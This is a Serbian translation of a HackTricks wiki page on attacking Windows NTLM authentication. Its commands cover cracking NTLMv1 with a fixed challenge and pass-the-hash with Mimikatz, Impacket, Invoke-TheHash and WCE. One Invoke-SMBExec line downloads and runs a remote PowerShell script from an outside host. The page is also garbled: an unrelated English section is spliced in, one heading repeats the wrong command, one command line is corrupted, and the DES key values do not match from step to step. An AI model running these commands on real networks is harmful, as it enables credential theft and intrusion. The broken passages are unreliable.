# NTLM

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Osnovne informacije

U okruženjima gde su **Windows XP i Server 2003** u upotrebi, koriste se LM (Lan Manager) heševi, iako je široko poznato da se oni lako mogu kompromitovati. Određeni LM heš, `AAD3B435B51404EEAAD3B435B51404EE`, označava scenario gde se LM ne koristi, predstavljajući heš za prazan string.

Podrazumevano, **Kerberos** autentifikacioni protokol je primarni metod koji se koristi. NTLM (NT LAN Manager) se koristi u određenim okolnostima: odsustvo Active Directory-ja, nepostojanje domena, neispravna konfiguracija Kerberosa ili kada se pokušavaju veze koristeći IP adresu umesto validnog imena hosta.

Prisustvo **"NTLMSSP"** zaglavlja u mrežnim paketima signalizira NTLM autentifikacioni proces.

Podrška za autentifikacione protokole - LM, NTLMv1 i NTLMv2 - omogućena je specifičnom DLL datotekom smeštenom na lokaciji `%windir%\Windows\System32\msv1\_0.dll`.

**Ključne tačke**:

* LM heševi su ranjivi, a prazan LM heš (`AAD3B435B51404EEAAD3B435B51404EE`) označava da se ne koristi.
* Kerberos je podrazumevani autentifikacioni metod, dok se NTLM koristi samo u određenim uslovima.
* Paketi za NTLM autentifikaciju su prepoznatljivi po zaglavlju "NTLMSSP".
* LM, NTLMv1 i NTLMv2 protokoli podržani su sistemskom datotekom `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Možete proveriti i konfigurisati koji protokol će se koristiti:

### GUI

Izvršite _secpol.msc_ -> Lokalne politike -> Opcije bezbednosti -> Mrežna bezbednost: Nivo autentifikacije LAN Manager-a. Postoje 6 nivoa (od 0 do 5).

![](<../../.gitbook/assets/image (919).png>)

### Registar

Ovo će postaviti nivo 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moguće vrednosti:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Osnovna NTLM šema autentifikacije domena

1. **Korisnik** unosi svoje **poverilačne podatke**
2. Klijentski uređaj **šalje zahtev za autentifikaciju** slanjem **imenom domena** i **korisničkim imenom**
3. **Server** šalje **izazov**
4. **Klijent enkriptuje** izazov koristeći heš lozinke kao ključ i šalje ga kao odgovor
5. **Server šalje** **kontroloru domena** ime domena, korisničko ime, izazov i odgovor. Ako nije konfigurisan Active Directory ili je ime domena ime servera, poverilačni podaci se **proveravaju lokalno**.
6. **Kontrolor domena proverava da li je sve ispravno** i šalje informacije serveru

**Server** i **Kontrolor domena** mogu da kreiraju **bezbedan kanal** putem **Netlogon** servera jer Kontrolor domena zna lozinku servera (nalazi se u bazi podataka **NTDS.DIT**).

### Lokalna NTLM autentifikaciona šema

Autentifikacija je kao što je pomenuto **ranije ali** server zna **heš korisnika** koji pokušava da se autentifikuje unutar **SAM** fajla. Dakle, umesto da pita Kontrolor domena, **server će sam proveriti** da li korisnik može da se autentifikuje.

### NTLMv1 Izazov

Dužina **izazova je 8 bajtova** a **odgovor je dugačak 24 bajta**.

**Heš NT (16 bajtova)** je podeljen u **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo je popunjen nulama**. Zatim, **izazov** je **šifrovan odvojeno** sa svakim delom i **rezultujući** šifrovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24B.

**Problemi**:

* Nedostatak **slučajnosti**
* 3 dela mogu biti **napadnuti odvojeno** kako bi se pronašao NT heš
* **DES je moguće probiti**
* 3. ključ je uvek sastavljen od **5 nula**
* Sa istim izazovom, **odgovor će biti isti**. Dakle, možete dati kao **izazov** žrtvi string "**1122334455667788**" i napasti odgovor koristeći **prethodno izračunate tabele duge**.

### Napad NTLMv1

Danas je sve manje uobičajeno naći okruženja sa konfigurisanim Neograničenim Delegiranjem, ali to ne znači da ne možete **zloupotrebiti Print Spooler servis** koji je konfigurisan.

Mogli biste zloupotrebiti neke poverilačne podatke/sesije koje već imate na AD-u da **zatražite od štampača da se autentifikuje** protiv nekog **hosta pod vašom kontrolom**. Zatim, koristeći `metasploit auxiliary/server/capture/smb` ili `responder` možete **postaviti autentifikacioni izazov na 1122334455667788**, uhvatiti pokušaj autentifikacije, i ako je urađen korišćenjem **NTLMv1** moći ćete ga **probiti**.\
Ako koristite `responder` možete pokušati da \*\*koristite zastavicu `--lm` \*\* da pokušate **smanjiti** **autentifikaciju**.\
_Napomena da za ovu tehniku autentifikacija mora biti izvršena korišćenjem NTLMv1 (NTLMv2 nije validan)._

Zapamtite da će štampač koristiti račun računara tokom autentifikacije, a računari koriste **dugme i slučajne lozinke** koje verovatno **nećete moći probiti** korišćenjem uobičajenih **rečnika**. Ali autentifikacija **NTLMv1** koristi **DES** ([više informacija ovde](./#ntlmv1-challenge)), pa korišćenjem nekih servisa posebno posvećenih probijanju DES-a moći ćete ga probiti (možete koristiti [https://crack.sh/](https://crack.sh) na primer).

### Napad NTLMv1 sa hashcat-om

NTLMv1 takođe može biti probijen sa NTLMv1 Multi Alatom [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) koji formatira NTLMv1 poruke na način koji može biti probijen sa hashcat-om.

Komanda
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM

### NTLM Relay Attack

NTLM prenos napada je tehnika napada koja se koristi za preusmeravanje NTLM autentifikacije sa žrtve na napadača. Napadač može iskoristiti ovu tehniku da bi dobio pristup sistemima na mreži bez potrebe za prethodnim poznavanjem lozinke žrtve. Ovo je moguće kada su NTLM autentifikacija i autorizacija zasnovane na lozinkama i kada se koristi NTLM v1 ili NTLM v2 protokol.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Kreirajte fajl sa sledećim sadržajem:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Pokrenite hashcat (najbolje distribuirano putem alata poput hashtopolis) jer će inače ovo potrajati nekoliko dana.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
U ovom slučaju znamo da je lozinka za ovo password pa ćemo varati u svrhe demonstracije:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sada moramo koristiti hashcat-utilities da bismo pretvorili provaljene des ključeve u delove NTLM heša:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Konačno poslednji deo:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM

---

### NTLMv1

NTLMv1 is considered to be weak and is susceptible to various attacks such as **Pass-the-Hash** and **Pass-the-Ticket**. It is recommended to disable NTLMv1 and use NTLMv2 or **Kerberos** instead.

---

### NTLMv2

NTLMv2 is more secure than NTLMv1 and includes additional security features such as **extended session security** and **server challenge/response**. It is recommended to use NTLMv2 for improved security.

---

### NTLM Relay Attack

NTLM Relay Attack is a common technique used by attackers to relay authentication attempts to a target server, allowing them to impersonate a legitimate user. To prevent NTLM Relay Attacks, **enforce SMB signing**, **use Extended Protection for Authentication (EPA)**, and **disable NTLM authentication** where possible.

---

### NTLM Downgrade Attacks

NTLM Downgrade Attacks involve forcing a system to use weaker NTLM protocols instead of stronger ones like NTLMv2 or **Kerberos**. To mitigate NTLM Downgrade Attacks, ensure that **NTLMv1 is disabled**, **NTLMv2 is enforced**, and **Kerberos** is used wherever possible.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Izazov

**Dužina izazova je 8 bajtova** i **poslata su 2 odgovora**: Jedan je **dugačak 24 bajta** a dužina **drugog** je **promenljiva**.

**Prvi odgovor** je kreiran šifrovanjem korišćenjem **HMAC\_MD5** stringa koji se sastoji od **klijenta i domena** i korišćenjem **MD4 heša** od **NT heša** kao **ključa**. Zatim, **rezultat** će biti korišćen kao **ključ** za šifrovanje korišćenjem **HMAC\_MD5** izazova. Na to će biti dodat **klijentski izazov od 8 bajtova**. Ukupno: 24 B.

**Drugi odgovor** je kreiran korišćenjem **nekoliko vrednosti** (novi klijentski izazov, **vremenska oznaka** da se izbegnu **ponovljeni napadi**...)

Ako imate **pcap datoteku koja je zabeležila uspešan proces autentifikacije**, možete pratiti ovaj vodič da biste dobili domen, korisničko ime, izazov i odgovor i pokušali da probijete lozinku: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Kada imate heš žrtve**, možete ga koristiti da biste se **predstavili** kao ta osoba.\
Potrebno je koristiti **alat** koji će **izvršiti** NTLM autentifikaciju koristeći taj **heš**, **ili** možete kreirati novi **sessionlogon** i **ubaciti** taj **heš** unutar **LSASS**, tako da kada se izvrši bilo koja **NTLM autentifikacija**, taj **heš će biti korišćen.** Poslednja opcija je ono što radi mimikatz.

**Molimo vas, zapamtite da možete izvršiti napade Pass-the-Hash takođe koristeći račune računara.**

### **Mimikatz**

**Mora se pokrenuti kao administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Ovo će pokrenuti proces koji će pripadati korisnicima koji su pokrenuli mimikatz, ali interno u LSASS-u sačuvane akreditacije su one unutar parametara mimikatz-a. Zatim, možete pristupiti mrežnim resursima kao da ste taj korisnik (slično triku `runas /netonly`, ali vam nije potrebna lozinka u obliku običnog teksta).

### Pass-the-Hash sa linuxa

Možete dobiti izvršenje koda na Windows mašinama koristeći Pass-the-Hash sa Linuxa.\
[**Pristupite ovde da saznate kako to uraditi.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows kompilovani alati

Možete preuzeti [Impacket binarne datoteke za Windows ovde](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (U ovom slučaju morate navesti komandu, cmd.exe i powershell.exe nisu validni za dobijanje interaktivne ljuske)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Postoji još nekoliko Impacket binarnih datoteka...

### Invoke-TheHash

Možete dobiti powershell skripte odavde: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Pozovi-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Pozovi-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Pozovi-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Pozovi-Hash

Ova funkcija je **kombinacija svih ostalih**. Možete proslediti **više domaćina**, **isključiti** neke i **odabrati** **opciju** koju želite da koristite (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ako odaberete **bilo koju** od **SMBExec** i **WMIExec** ali ne navedete _**Command**_ parametar, samo će **proveriti** da li imate **dovoljno dozvola**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Prosledi heš](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Potrebno je pokrenuti kao administrator**

Ovaj alat će uraditi istu stvar kao i mimikatz (modifikovati LSASS memoriju).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ručno izvršavanje udaljenih Windows operacija sa korisničkim imenom i lozinkom

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Izvlačenje akreditiva sa Windows računara

**Za više informacija o** [**kako dobiti akreditive sa Windows računara treba da pročitate ovu stranicu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Prenos i Responder

**Pročitajte detaljniji vodič o tome kako izvesti ove napade ovde:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Parsiranje NTLM izazova iz snimka mreže

**Možete koristiti** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite vašu **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>
